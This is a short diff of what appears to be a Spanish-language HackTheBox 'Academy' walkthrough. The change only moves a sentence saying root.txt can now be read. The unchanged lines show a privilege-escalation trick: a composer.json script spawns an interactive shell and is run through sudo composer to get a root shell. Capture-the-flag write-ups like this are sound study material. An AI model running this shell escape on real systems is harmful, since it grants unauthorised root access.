@@ -95,8 +95,9 @@ TF=$(mktemp -d)
 echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
 sudo composer --working-dir=$TF run-script x
 ```
+Ya puedo leer el root.txt
 
 ![](/assets/images/Academy-Hackthebox/root.png)
 
-Ya puedo leer el root.txt
+
 
